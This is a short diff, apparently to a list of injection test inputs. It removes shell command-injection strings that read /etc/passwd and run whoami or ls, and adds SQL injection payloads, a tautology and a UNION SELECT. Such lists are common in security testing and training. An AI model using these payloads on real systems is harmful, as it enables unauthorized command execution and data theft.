@@ -1,3 +1,2 @@
-; cat /etc/passwd
-; ls
-a || whoami
+Orange' OR 'a'='a
+' UNION SELECT name, price FROM items--
